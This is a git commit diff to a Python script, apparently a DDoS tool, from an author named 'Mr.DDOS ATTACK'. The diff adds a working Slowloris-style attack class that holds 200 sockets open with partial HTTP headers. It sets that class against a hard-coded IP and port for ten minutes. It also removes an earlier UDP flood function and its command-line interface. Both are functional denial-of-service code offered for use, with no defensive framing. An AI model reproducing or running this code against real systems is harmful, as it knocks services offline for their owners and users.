45e49223c961f40c3c6cad5b3345da72d3923ae5
Mr.DDOS ATTACK <96361084+Xsarjame@users.noreply.github.com>
2022-02-19 17:11:10 +0700

    Update Chakri112.py

--- Chakri112.py
+++ Chakri112.py
@@ -138,50 +138,47 @@ def usage():
                                                                  .,/((*,,....... .......,*/((/,.                 
 
     """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+class DeadlyBooring():
+    def __init__(self, ip, port=80, socketsCount = 200):
+        self._ip = ip
+        self._port = port
+        self._headers = [
+            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
+            "Accept-Language: en-us,en;q=0.5"
+        ]
+        self._sockets = [self.newSocket() for _ in range(socketsCount)]
+
+    def getMessage(self, message):
+        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
+
+    def newSocket(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4)
+            s.connect((self._ip, self._port))
+            s.send(self.getMessage("Get /?"))
+            for header in self._headers:
+                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
+            return s
+        except socket.error as se:
+            print("Error: "+str(se))
+            time.sleep(0.5)
+            return self.newSocket()
+
+    def attack(self, timeout=sys.maxsize, sleep=15):
+        t, i = time.time(), 0
+        while(time.time() - t < timeout):
+            for s in self._sockets:
+                try:
+                    print("Sending request #{}".format(str(i)))
+                    s.send(self.getMessage("X-a: "))
+                    i += 1
+                except socket.error:
+                    self._sockets.remove(s)
+                    self._sockets.append(self.newSocket())
+                time.sleep(sleep/len(self._sockets))
 
 
-def attack(ip, port, time, size):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(65535, port))
-
-    fmt = 'Attacking {ip} on {port} for {time} with a size of {size} bytes.'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports',
-        time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
-        size=size
-    )
-    print(fmt)
-
-    startup = tt()
-    size = os.urandom(min(65500, size))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or random.randint(1, 65535)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(size, (ip, port))
-
-    print('Attack finished.')
-
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='Usage: python ud.py <ip> <port> <time> <size>')
-
-    parser.add_argument('ip', type=str, help='IP or domain to attack.')
-    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
-    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
-    parser.add_argument('-s', '--size', type=int, default=1024, help='Size in bytes.')
-
-    args = parser.parse_args()
-
-    try:
-        attack(args.ip, args.port, args.time, args.size)
-    except KeyboardInterrupt:
-        print('Attack stopped.')
+if __name__ == "__main__":
+    dos = DeadlyBooring("192.168.0.236", 81, socketsCount=200)
+    dos.attack(timeout=60*10)
